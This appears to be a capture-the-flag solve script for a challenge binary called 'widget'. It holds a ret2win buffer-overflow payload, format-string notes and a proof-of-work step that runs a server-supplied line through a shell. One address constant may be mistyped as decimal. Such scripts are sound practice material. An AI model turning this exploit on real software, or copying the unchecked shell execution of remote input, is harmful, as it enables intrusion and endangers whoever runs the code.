from pwn import *

elf = context.binary =ELF("./widget")
libc = elf.libc
r = process()
context.clear(os="linux", arch='x86_64', log_level="DEBUG")
#gdb.attach(r, api = True)
r = remote("challs.actf.co", 31320)
# #pow bypass
r.recv(15)
payload = r.recvline()
result = subprocess.run(payload, capture_output=True, shell=True, check=True)
r.sendline(result.stdout)
#Ret2Win
padding = 40
r.sendlineafter("Amount:", str(0x100))
r.sendlineafter("Contents:", b"A" * (padding - 8) + p64(404500) + p64(0x40130B))

r.interactive()

#0x401455 <-- read
#0x4014c7 <-- ret


+----------------+
|   "%33$p|||"   |  <--- 8 bytes
+----------------+
|    ||||||||    |  <--- 8 bytes
+----------------+
        ...         <--- 24 bytes
+----------------+
|   0x004013d9   |  <--- called = 1
+----------------+


0x401455 : read(OverFlow)
0x4014c0 : format string
0x4014c7 : return
